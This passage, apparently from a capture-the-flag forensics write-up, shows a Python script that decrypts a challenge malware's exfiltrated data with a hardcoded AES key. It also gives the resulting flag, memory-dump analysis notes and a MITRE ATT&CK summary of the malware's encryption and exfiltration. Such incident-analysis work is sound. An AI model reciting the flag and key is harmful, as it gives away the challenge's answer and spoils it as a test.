\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> base64.b64decode(encrypted_text)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    iv \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> encrypted_bytes[:\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">16\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    cipher_text \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> encrypted_bytes[\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">16\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">:]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    cipher \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> AES\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">.new(key_hash, \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">AES\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">.\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">MODE_CBC\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">, iv)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    decrypted_bytes \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> cipher.decrypt(cipher_text)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    pad_len \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> decrypted_bytes[\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">1\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    decrypted_bytes \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> decrypted_bytes[:\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">pad_len]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\"> \u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">    return\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> decrypted_bytes.decode(\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">'utf-8'\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\"> \u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">with\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> open\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">(\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">'./decoded_output.txt'\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">, \u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">'r'\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">) \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">as\u003C/span>\u003Cspan style=\"--shiki-light:#702C00;--shiki-dark:#FFB757\"> file\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">:\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    lines \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#702C00;--shiki-dark:#FFB757\"> file\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">.readlines()\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\"> \u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">decoded_output \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> ''\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">for\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> line \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">in\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> lines:\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    line \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> line.strip()\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">    if\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> line: \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">        replaced_line \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> reverse_decode(line)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">        plain \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> aes_decrypt(replaced_line,\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"YaMfem0zr4jdiZsDUxv1TH69\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">        decoded_output \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">+=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> plain\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\"> \u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">print\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">(decoded_output)\u003C/span>\u003C/span>\u003Cbutton type=\"button\" title=\"Copy code\" aria-label=\"Copy code\" data=\"import base64\nfrom Crypto.Cipher import AES\nfrom Crypto.Hash import SHA256\n\ndef reverse_decode(encoded_data):\n    reversed_data = encoded_data[::-1]\n    replaced_data = reversed_data.replace(&#x27;-&#x27;, &#x27;C&#x27;).replace(&#x27;_&#x27;, &#x27;E&#x27;)\n    \n    padding = 4 - (len(replaced_data) % 4)\n    if padding \u003C 4:\n        replaced_data += &#x27;=&#x27; * padding\n\n    return replaced_data \n\ndef aes_decrypt(encrypted_text, key):\n    key_hash = SHA256.new(key.encode(&#x27;utf-8&#x27;)).digest()\n\n    encrypted_bytes = base64.b64decode(encrypted_text)\n    \n    iv = encrypted_bytes[:16]\n    cipher_text = encrypted_bytes[16:]\n    \n    cipher = AES.new(key_hash, AES.MODE_CBC, iv)\n    \n    decrypted_bytes = cipher.decrypt(cipher_text)\n    \n    pad_len = decrypted_bytes[-1]\n    decrypted_bytes = decrypted_bytes[:-pad_len]\n\n    return decrypted_bytes.decode(&#x27;utf-8&#x27;)\n\nwith open(&#x27;./decoded_output.txt&#x27;, &#x27;r&#x27;) as file:\n    lines = file.readlines()\n\ndecoded_output = &#x27;&#x27;\nfor line in lines:\n    line = line.strip()\n    if line: \n        replaced_line = reverse_decode(line)\n        plain = aes_decrypt(replaced_line,&#x22;YaMfem0zr4jdiZsDUxv1TH69&#x22;)\n        decoded_output += plain\n\nprint(decoded_output)\" class=\"rehype-pretty-copy\" onclick=\"navigator.clipboard.writeText(this.attributes.data.value);this.classList.add(&#x27;rehype-pretty-copied&#x27;);window.setTimeout(() => this.classList.remove(&#x27;rehype-pretty-copied&#x27;), 1000);\">\u003Cspan class=\"ready\">\u003C/span>\u003Cspan class=\"success\">\u003C/span>\u003C/button>\u003Cstyle>:root {--copy-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23adadad' d='M16.187 9.5H12.25a1.75 1.75 0 0 0-1.75 1.75v28.5c0 .967.784 1.75 1.75 1.75h23.5a1.75 1.75 0 0 0 1.75-1.75v-28.5a1.75 1.75 0 0 0-1.75-1.75h-3.937a4.25 4.25 0 0 1-4.063 3h-7.5a4.25 4.25 0 0 1-4.063-3M31.813 7h3.937A4.25 4.25 0 0 1 40 11.25v28.5A4.25 4.25 0 0 1 35.75 44h-23.5A4.25 4.25 0 0 1 8 39.75v-28.5A4.25 4.25 0 0 1 12.25 7h3.937a4.25 4.25 0 0 1 4.063-3h7.5a4.25 4.25 0 0 1 4.063 3M18.5 8.25c0 .966.784 1.75 1.75 1.75h7.5a1.75 1.75 0 1 0 0-3.5h-7.5a1.75 1.75 0 0 0-1.75 1.75'/%3E%3C/svg%3E\");--success-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%2366ff85' d='M9 16.17L5.53 12.7a.996.996 0 1 0-1.41 1.41l4.18 4.18c.39.39 1.02.39 1.41 0L20.29 7.71a.996.996 0 1 0-1.41-1.41z'/%3E%3C/svg%3E\");}pre:has(code) {position: relative;}pre button.rehype-pretty-copy {right: 1px;padding: 0;width: 24px;height: 24px;display: flex;margin-top: 2px;margin-right: 8px;position: absolute;border-radius: 25%;backdrop-filter: blur(3px);& span {width: 100%;aspect-ratio: 1 / 1;}& .ready {background-image: var(--copy-icon);}& .success {display: none; background-image: var(--success-icon);}}&.rehype-pretty-copied {& .success {display: block;} & .ready {display: none;}}pre button.rehype-pretty-copy.rehype-pretty-copied {opacity: 1;& .ready { display: none; }& .success { display: block; }}pre button.rehype-pretty-copy { opacity: 0; }figure[data-rehype-pretty-code-figure]:hover > pre > code button.rehype-pretty-copy {opacity: 1;}\u003C/style>\u003C/code>\u003C/pre>\u003C/figure>\n\u003Cfigure data-rehype-pretty-code-figure=\"\">\u003Cpre style=\"--shiki-light:#0e1116;--shiki-dark:#f0f3f6;--shiki-light-bg:#ffffff;--shiki-dark-bg:#0a0c10\" tabindex=\"0\" data-language=\"powershell\" data-theme=\"github-light-high-contrast github-dark-high-contrast\">\u003Ccode data-language=\"powershell\" data-theme=\"github-light-high-contrast github-dark-high-contrast\" style=\"display: grid;\">\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">python .\\FinalDecryptttt.py\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">ASCIS{N0th1n9_1$_m0r3_pr3c10u5_7h4n_1ndEp3ndenc3_\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">&#x26;\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">_fr33d0m}\u003C/span>\u003C/span>\u003Cbutton type=\"button\" title=\"Copy code\" aria-label=\"Copy code\" data=\"python .\\FinalDecryptttt.py\nASCIS{N0th1n9_1$_m0r3_pr3c10u5_7h4n_1ndEp3ndenc3_&#x26;_fr33d0m}\" class=\"rehype-pretty-copy\" onclick=\"navigator.clipboard.writeText(this.attributes.data.value);this.classList.add(&#x27;rehype-pretty-copied&#x27;);window.setTimeout(() => this.classList.remove(&#x27;rehype-pretty-copied&#x27;), 1000);\">\u003Cspan class=\"ready\">\u003C/span>\u003Cspan class=\"success\">\u003C/span>\u003C/button>\u003Cstyle>:root {--copy-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23adadad' d='M16.187 9.5H12.25a1.75 1.75 0 0 0-1.75 1.75v28.5c0 .967.784 1.75 1.75 1.75h23.5a1.75 1.75 0 0 0 1.75-1.75v-28.5a1.75 1.75 0 0 0-1.75-1.75h-3.937a4.25 4.25 0 0 1-4.063 3h-7.5a4.25 4.25 0 0 1-4.063-3M31.813 7h3.937A4.25 4.25 0 0 1 40 11.25v28.5A4.25 4.25 0 0 1 35.75 44h-23.5A4.25 4.25 0 0 1 8 39.75v-28.5A4.25 4.25 0 0 1 12.25 7h3.937a4.25 4.25 0 0 1 4.063-3h7.5a4.25 4.25 0 0 1 4.063 3M18.5 8.25c0 .966.784 1.75 1.75 1.75h7.5a1.75 1.75 0 1 0 0-3.5h-7.5a1.75 1.75 0 0 0-1.75 1.75'/%3E%3C/svg%3E\");--success-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%2366ff85' d='M9 16.17L5.53 12.7a.996.996 0 1 0-1.41 1.41l4.18 4.18c.39.39 1.02.39 1.41 0L20.29 7.71a.996.996 0 1 0-1.41-1.41z'/%3E%3C/svg%3E\");}pre:has(code) {position: relative;}pre button.rehype-pretty-copy {right: 1px;padding: 0;width: 24px;height: 24px;display: flex;margin-top: 2px;margin-right: 8px;position: absolute;border-radius: 25%;backdrop-filter: blur(3px);& span {width: 100%;aspect-ratio: 1 / 1;}& .ready {background-image: var(--copy-icon);}& .success {display: none; background-image: var(--success-icon);}}&.rehype-pretty-copied {& .success {display: block;} & .ready {display: none;}}pre button.rehype-pretty-copy.rehype-pretty-copied {opacity: 1;& .ready { display: none; }& .success { display: block; }}pre button.rehype-pretty-copy { opacity: 0; }figure[data-rehype-pretty-code-figure]:hover > pre > code button.rehype-pretty-copy {opacity: 1;}\u003C/style>\u003C/code>\u003C/pre>\u003C/figure>\n\u003C/section>\u003C/section>\u003Csection class=\"heading\" data-heading-rank=\"2\" aria-labelledby=\"note\">\u003Ch2 id=\"note\">Note\u003C/h2>\n\u003Cp>When analyzing the memdump, I used the ‘strings’ command to capture the PowerShell script as well as to check the processes running within the memory dump. But there are better ways to do this.\u003C/p>\n\u003Cp>We could load the memdump into Visual Studio to check the memdump modules:\u003C/p>\n\u003Cp>![alt text](&#x3C;../../../assets/images/urgent-tina/2025-04-08_22-13.png)\r\n\u003Cem>update.DMP in Visual Studio\u003C/em>\u003C/p>\n\u003Cp>We could see the process name as well as the modules that were loaded. After some searching, we could determine that the program was executing a PowerShell script.\u003C/p>\n\u003Cp>![alt text](&#x3C;../../../assets/images/urgent-tina/2025-04-09_00-45.png)\r\n\u003Cem>PowerShell related modules\u003C/em>\u003C/p>\n\u003Cp>Running diagnostic analysis, we could confirm that the program used PowerShell:\u003C/p>\n\u003Cp>![alt text](&#x3C;../../../assets/images/urgent-tina/2025-04-09_01-42.png)\r\n\u003Cem>Diagnostic analysis\u003C/em>\u003C/p>\n\u003Cp>We won’t find the \u003Ccode>update.ps1\u003C/code> here; that’s where we return to the \u003Ccode>strings\u003C/code> method.\u003C/p>\n\u003Cp>Another way was using \u003Ccode>DetectItEasy\u003C/code> to analyze the memdump, with the following results.\u003C/p>\n\u003Cp>![alt text](&#x3C;../../../assets/images/urgent-tina/2025-04-09_15-36.png)\r\n\u003Cem>DiE results\u003C/em>\u003C/p>\n\u003Cp>As we can see, this was a Windows Minidump containing PowerShell script code, which is why we needed to use the \u003Ccode>strings\u003C/code> method to extract the script.\u003C/p>\n\u003Cblockquote>\n\u003Cp>Till this point I know that the memdump wasn’t corrupted but rather a minidump.\u003C/p>\n\u003C/blockquote>\n\u003C/section>\u003Csection class=\"heading\" data-heading-rank=\"2\" aria-labelledby=\"thoughts-on-the-challenge\">\u003Ch2 id=\"thoughts-on-the-challenge\">Thoughts on the challenge\u003C/h2>\n\u003Cp>This was a pretty fun challenge. Finding the PowerShell script was particularly challenging from the get-go since we didn’t know what we were looking for.\u003C/p>\n\u003Cp>Based on the \u003Ccode>MITRE ATT&#x26;CK Framework\u003C/code>, the following techniques were used in this malware:\u003C/p>\n\u003Cul>\n\u003Cli>\u003Ccode>T1059.001\u003C/code>: Command and Scripting Interpreter: PowerShell\u003C/li>\n\u003Cli>\u003Ccode>T1486\u003C/code>: Data Encrypted for Impact\u003C/li>\n\u003Cli>\u003Ccode>T1041\u003C/code>: Exfiltration Over C2 Channel\u003C/li>\n\u003Cli>\u003Ccode>T1564.001\u003C/code>: Hide Artifacts: Hidden Files and Directories\u003C/li>\n\u003Cli>\u003Ccode>T1027\u003C/code>: Obfuscated Files or Information\u003C/li>\n\u003C/ul>\n\u003Cp>The malware avoids encrypting OS files, uses AES with randomized keys for the encryption process. Exfiltration is HTTP-based with a combination of base64, AES, and ZIP encoding.\u003C/p>\n\u003Cblockquote>\n\u003Cp>Thanks to the \u003Ccode>.pcapng\u003C/code> file, we were able to solve this challenge. This highlights the importance of enabling DNS, HTTP, and command-line logging (through tools like Sysmon, Windows Defender ATP, etc.).\r\n{: .prompt-tip}\u003C/p>\n\u003C/blockquote>\n\u003Cp>That’s all for this challenge :33 Peaceeeeee\u003C/p>\u003C/section>",{"headings":57,"localImagePaths":127,"remoteImagePaths":128,"frontmatter":129,"imagePaths":132},[58,62,65,69,73,76,79,82,85,88,91,94,97,100,103,106,109,112,115,118,121,124],{"depth":59,"slug":60,"text":61},2,"challenge-description","Challenge Description:",{"depth":59,"slug":63,"text":64},"thought-process","Thought process",{"depth":66,"slug":67,"text":68},3,"file-inspection","File inspection",{"depth":70,"slug":71,"text":72},4,"pcapng-file-inspection",".pcapng file inspection",{"depth":70,"slug":74,"text":75},"memdump-inspection","memdump inspection",{"depth":66,"slug":77,"text":78},"powershell-code-block-analysis","PowerShell code block analysis",{"depth":70,"slug":80,"text":81},"aesencryption","AESEncryption",{"depth":70,"slug":83,"text":84},"r64encoder","R64Encoder",{"depth":70,"slug":86,"text":87},"sendresults","SendResults",{"depth":70,"slug":89,"text":90},"encryptfiles","EncryptFiles",{"depth":70,"slug":92,"text":93},"exfiltratefiles","ExfiltrateFiles",{"depth":70,"slug":95,"text":96},"main","Main",{"depth":66,"slug":98,"text":99},"reversing-the-encryption-process","Reversing the encryption process",{"depth":70,"slug":101,"text":102},"encrypeddatapackage-xox","encrypedDataPackage (XoX)",{"depth":70,"slug":104,"text":105},"combinedmetadata-2yngy","combinedMetadata (2YngY)",{"depth":70,"slug":107,"text":108},"encryptedaeskey-cvf","encryptedAesKey (cvf)",{"depth":70,"slug":110,"text":111},"derivedkeyfromdatetime-uz19o","derivedKeyFromDateTime (Uz19o)",{"depth":70,"slug":113,"text":114},"masterencryptionkey-wietm","masterEncryptionKey (WiETm)",{"depth":70,"slug":116,"text":117},"logs","Logs",{"depth":66,"slug":119,"text":120},"finding-the-flag","Finding the flag",{"depth":59,"slug":122,"text":123},"note","Note",{"depth":59,"slug":125,"text":126},"thoughts-on-the-challenge","Thoughts on the challenge",[51],[],{"title":39,"description":40,"date":130,"tags":131,"image":52},["Date","2025-04-04T00:00:00.000Z"],[44,45,46,47],[51]]